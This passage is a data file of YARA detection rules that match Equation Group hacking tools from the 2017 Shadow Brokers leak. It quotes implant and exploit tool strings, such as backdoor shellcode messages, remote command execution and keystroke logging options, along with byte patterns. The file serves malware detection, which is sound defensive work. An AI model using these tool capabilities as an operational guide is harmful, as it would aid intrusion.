Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:53:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"@@for /f \\\"delims=\\\" %%i in ('findstr /smc:\\\"%s\\\" *.msg') do if not \\\"%%MsgFile1%%\\\"==\\\"%%i\\\" del /f \\\"%%i\\\"\" fullword ascii\n      $x2 = \"Logging out of WebAdmin (as target account)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}","date":"2017-04-15 16:53:41","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Easybee_1_0_1_RID3663","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"05bd44b7d8917b450651b5e3e557712e","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Regread_1_1_1_RID3660 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:53:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] Connected to the Registry Service\" fullword ascii\n      $s2 = \"f08d49ac41d1023d9d462d58af51414daff95a6a\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )\n}","date":"2017-04-15 16:53:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Regread_1_1_1_RID3660","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"01ed91dcb5fabca7f3dff5ab656426b3","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Englishmansdentist_1_2_0_RID3B1A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 20:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] CheckCredentials(): Checking to see if valid username/password\" fullword ascii\n      $x2 = \"Error connecting to target, TbMakeSocket() %s:%d.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}","date":"2017-04-15 20:14:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Englishmansdentist_1_2_0_RID3B1A","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"706d7309640198c1a123fd2cbaa9013b","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Architouch_Eternalsynergy_Smbtouch_RID3FDF : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 23:38:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NtErrorMoreProcessingRequired\" fullword ascii\n      $s2 = \"Command Format Error: Error=%x\" fullword ascii\n      $s3 = \"NtErrorPasswordRestriction\" fullword ascii\n      $op0 = { 8a 85 58 ff ff ff 88 43 4d } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 2 of them )\n}","date":"2017-04-15 23:38:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Architouch_Eternalsynergy_Smbtouch_RID3FDF","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"8d5c2c5362470228952334a3f48f65ad","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Eternalromance_2_RID3837 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:11:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] Backdoor shellcode written\" fullword ascii\n      $x2 = \"[*] Attempting exploit method %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them )\n}","date":"2017-04-15 18:11:41","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Eternalromance_2_RID3837","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"0ec496b73b856ffdf3a4bfb720e5f306","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17__Emphasismine_RID3738 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:29:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Error: Could not calloc() for shellcode buffer\" fullword ascii\n      $x2 = \"shellcodeSize: 0x%04X + 0x%04X + 0x%04X = 0x%04X\" fullword ascii\n      $x3 = \"Generating shellcode\" fullword ascii\n      $x4 = \"([0-9a-zA-Z]+) OK LOGOUT completed\" fullword ascii\n      $x5 = \"Error: Domino is not the expected version. (%s, %s)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them )\n}","date":"2017-04-15 17:29:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17__Emphasismine_RID3738","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"515fb76bb78d2f7fdd538d206f811cf0","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Eternalromance_RID37A6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Error: Exploit choice not supported for target OS!!\" fullword ascii\n      $x2 = \"Error: Target machine out of NPP memory (VERY BAD!!) - Backdoor removed\" fullword ascii\n      $x3 = \"[-] Error: Backdoor not present on target\" fullword ascii\n      $x4 = \"***********    TARGET ARCHITECTURE IS X64    ************\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them ) or 2 of them\n}","date":"2017-04-15 17:47:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Eternalromance_RID37A6","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"857cc98a711449837051ff218e9d25e4","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Gen4_RID3344 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:40:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] \\\"TargetPort\\\"      %hu\" fullword ascii\n      $x2 = \"---<<<  Complete  >>>---\" fullword ascii\n      $x3 = \"[+] \\\"NetworkTimeout\\\"  %hu\" fullword ascii\n      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and ( 1 of ( $x* ) or 2 of them ) )\n}","date":"2017-04-15 14:40:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Gen4_RID3344","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"b33c0b85651708e85d11c38c56f69966","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Gen1_RID3341 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:40:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Restart with the new protocol, address, and port as target.\" fullword ascii\n      $x2 = \"TargetPort      : %s (%u)\" fullword ascii\n      $x3 = \"Error: strchr() could not find '@' in account name.\" fullword ascii\n      $x4 = \"TargetAcctPwd   : %s\" fullword ascii\n      $x5 = \"Creating CURL connection handle...\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them )\n}","date":"2017-04-15 14:40:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Gen1_RID3341","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"9aa747526894fd276fa6f2247eaa34e5","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Gen2_RID3342 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:40:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[+] Setting password : (NULL)\" fullword ascii\n      $s2 = \"[-] TbBuffCpy() failed!\" fullword ascii\n      $s3 = \"[+] SMB negotiation\" fullword ascii\n      $s4 = \"12345678-1234-ABCD-EF00-0123456789AB\" fullword ascii\n      $s5 = \"Value must end with 0000 (2 NULLs)\" fullword ascii\n      $s6 = \"[*] Configuring Payload\" fullword ascii\n      $s7 = \"[*] Connecting to listener\" fullword ascii\n      $op1 = { b0 42 40 00 89 44 24 30 c7 44 24 34 } \n      $op2 = { eb 59 8b 4c 24 10 68 1c 46 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of ( $s* ) and 1 of ( $op* ) ) or 3 of them\n}","date":"2017-04-15 14:40:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Gen2_RID3342","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"df4f2e422261cb8e4a3a9b6e9bb4da13","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Gen3_RID3343 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:40:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Logon failed.  Kerberos ticket not yet valid (target and KDC times not synchronized)\" fullword ascii\n      $s2 = \"[-] Could not set \\\"CredentialType\\\"\" fullword ascii\n      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them )\n}","date":"2017-04-15 14:40:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Gen3_RID3343","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"2b7322579100e04f0e0c39d74c43b42a","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_yak_RID333B : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 14:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"-xd = dump archive data & store in scancodes.txt\" fullword ascii\n      $x2 = \"-------- driver start token -------\" fullword wide\n      $x3 = \"-------- keystart token -------\" fullword wide\n      $x4 = \"-xta = same as -xt but show special chars & store in keys_all.txt\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 2 of them )\n}","date":"2017-04-15 14:39:01","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_yak_RID333B","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"e3cd27eacf597e496ba46ff0123db4ba","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_AdUser_Implant_RID376E : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 17:38:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n      $s2 = \"(&(objectCategory=person)(objectClass=user)(cn=\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )\n}","date":"2017-04-15 17:38:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_AdUser_Implant_RID376E","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"7aae3acc15a6c23491c3e63158b37eef","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_RemoteExecute_Implant_RID3A69 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 53 00 63 00 68 00 65 00 64 00 75 00 6C 00 65 00\n               00 00 00 00 53 00 65 00 72 00 76 00 69 00 63 00\n               65 00 73 00 41 00 63 00 74 00 69 00 76 00 65 00\n               00 00 00 00 FF FF FF FF 00 00 00 00 B0 17 00 68\n               5C 00 70 00 69 00 70 00 65 00 5C 00 53 00 65 00\n               63 00 6F 00 6E 00 64 00 61 00 72 00 79 00 4C 00\n               6F 00 67 00 6F 00 6E 00 00 00 00 00 5C 00 00 00\n               57 00 69 00 6E 00 53 00 74 00 61 00 30 00 5C 00\n               44 00 65 00 66 00 61 00 75 00 6C 00 74 00 00 00\n               6E 00 63 00 61 00 63 00 6E 00 5F 00 6E 00 70 00\n               00 00 00 00 5C 00 70 00 69 00 70 00 65 00 5C 00\n               53 00 45 00 43 00 4C 00 4F 00 47 00 4F 00 4E } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )\n}","date":"2017-04-15 19:45:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_RemoteExecute_Implant_RID3A69","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"27425e42b9ac9cd66b1ee6a3853a64f9","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Banner_Implant9x_RID3831 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:10:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n      $op1 = { c9 c3 57 8d 85 2c eb ff ff } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them )\n}","date":"2017-04-15 18:10:41","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Banner_Implant9x_RID3831","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"1de788df6dafb8e4e8cf12ee45c50ae2","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_greatdoc_dll_config_RID39AF : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 19:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Projects\\\\GREATERDOCTOR\\\\trunk\\\\GREATERDOCTOR\" ascii\n      $x2 = \"src\\\\build\\\\Release\\\\dllConfig\\\\dllConfig.pdb\" ascii\n      $x3 = \"GREATERDOCTOR [ commandline args configuration ]\" fullword ascii\n      $x4 = \"-useage: <scanner> \\\"<cmdline args>\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )\n}","date":"2017-04-15 19:14:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_greatdoc_dll_config_RID39AF","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"464158b540f16b8b1b7689e619323d2f","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_scanner_RID34E0 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 15:49:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"+daemon_version,system,processor,refid,clock\" fullword ascii\n      $x2 = \"Usage: %s typeofscan IP_address\" fullword ascii\n      $x3 = \"# scanning ip  %d.%d.%d.%d\" fullword ascii\n      $x4 = \"Welcome to the network scanning tool\" fullword ascii\n      $x5 = \"***** %s ***** (length %d)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 1 of them )\n}","date":"2017-04-15 15:49:11","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_scanner_RID34E0","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"b4729cd00720fd4f6d0ce01484012b04","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Mcl_NtMemory_Std_RID3836 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:11:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 44 24 37 50 c6 44 24 38 72 c6 44 } \n      $op2 = { 44 24 33 6f c6 44 24 34 77 c6 } \n      $op3 = { 3b 65 c6 44 24 3c 73 c6 44 24 3d 73 c6 44 24 3e } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-04-15 18:11:31","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Mcl_NtMemory_Std_RID3836","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"9b64f40a57355e2545a7520a1c15e7ef","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_tacothief_RID35AD : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:23:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"File too large!  Must be less than 655360 bytes.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-04-15 16:23:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_tacothief_RID35AD","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"a830db478b5e1904ef1906d3b9ace7fb","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_ntevt_RID3427 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 15:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"c:\\\\ntevt.pdb\" fullword ascii\n      $s1 = \"ARASPVU\" fullword ascii\n      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 } \n      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 } \n      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and $x1 or 3 of them )\n}","date":"2017-04-15 15:18:21","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_ntevt_RID3427","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"a6a0d65030e5649d839fd735fb2f1073","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_Processes_Target_RID3873 : APT DEMO EXE FILE T1047 T1057 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 18:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1047, T1057\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Select * from Win32_Process\" fullword ascii\n      $s3 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n      $s5 = \"%4ls%2ls%2ls%2ls%2ls%2ls.%11l[0-9]%1l[+-]%6s\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}","date":"2017-04-15 18:21:41","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_Processes_Target_RID3873","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"cba8dba96720baeda15c13f9f376f822","score":75,"tags":["T1057","T1047","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_st_lp_RID3418 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 15:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Previous command: set injection processes (status=0x%x)\" fullword ascii\n      $x2 = \"Secondary injection process is <null> [no secondary process will be used]\" fullword ascii\n      $x3 = \"Enter the address to be used as the spoofed IP source address (xxx.xxx.xxx.xxx) -> \" fullword ascii\n      $x4 = \"E: Execute a Command on the Implant\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}","date":"2017-04-15 15:15:51","description":"Detects EquationGroup Tool - April Leak","minimum_yara":"1.7","name":"EquationGroup_Toolset_Apr17_st_lp_RID3418","reference":"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation","required_modules":[],"rule_hash":"4fb31bbcd5d00936c88852c0272ca08f","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_Toolset_Apr17_EpWrapper_RID358C : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15 16:17:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* Failed to get remote TCP socket address\" fullword wide\n      $x2 = \"* Failed to get 'LPStart' export\" fullword wide\n      $s5 = \"Usage: 